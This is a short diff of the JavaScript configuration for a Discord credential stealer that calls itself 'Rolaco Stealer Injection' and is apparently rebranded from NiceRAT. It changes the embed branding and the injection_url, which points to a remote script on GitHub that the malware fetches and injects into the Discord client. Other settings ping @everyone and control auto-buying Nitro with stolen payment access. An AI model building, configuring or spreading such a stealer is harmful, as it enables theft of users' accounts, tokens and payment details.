@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'ROlaco Stealer Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/0x00G/NiceRAT/main/img/Nice.png'.replace(/ /g, '%20'), 
+  embed_name: 'Rolaco Stealer Injection', 
+  embed_icon: 'https://raw.githubusercontent.com/Rolaco0/Rolacoim/main/mascot.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/NiceRAT/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/Rolaco0/Discord-Injection-RG/main/injection-clean.js', 
   /**
    
    **/
